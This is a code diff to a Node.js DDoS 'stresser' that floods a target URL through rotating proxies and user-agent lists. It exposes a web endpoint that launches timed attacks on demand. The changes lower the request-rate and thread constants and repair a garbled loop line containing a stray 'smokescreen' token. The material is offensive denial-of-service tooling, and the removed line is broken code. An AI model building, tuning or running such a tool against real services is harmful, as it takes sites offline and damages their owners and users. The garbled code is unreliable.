@@ -15,9 +15,9 @@ const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 
 // Configuration
-const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = 10000000;
-const numThreads = 1000;
+const maxRequests = 1000000; // Maximum total requests per attack
+const requestsPerSecond = 100; // Maximum requests per second
+const numThreads = 100; // Number of concurrent threads
 
 // Rate limiter state
 let requestCount = 0;
@@ -332,7 +332,7 @@ const startAttack = (url, durationHours) => {
             console.log(rainbow("Attack duration completed. Stopping attack."));
         }, duration);
 
-        for smokescreen for (let i = 0; i < Math.min(numThreads, proxies.length); i++) {
+        for (let i = 0; i < Math.min(numThreads, proxies.length); i++) {
             if (!continueAttack) break;
 
             const randomProxy = getRandomElement(proxies);
@@ -361,7 +361,7 @@ app.get("/stresser", async (req, res) => {
     startAttack(targetUrl, durationHours);
 });
 
-const port = process.env.PORT || 25694 || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
+const port = process.env.PORT || 25694;
 app.listen(port, () => {
     console.log(rainbow(`API running on http://localhost:${port}`));
     if (continueAttack && targetUrl) {
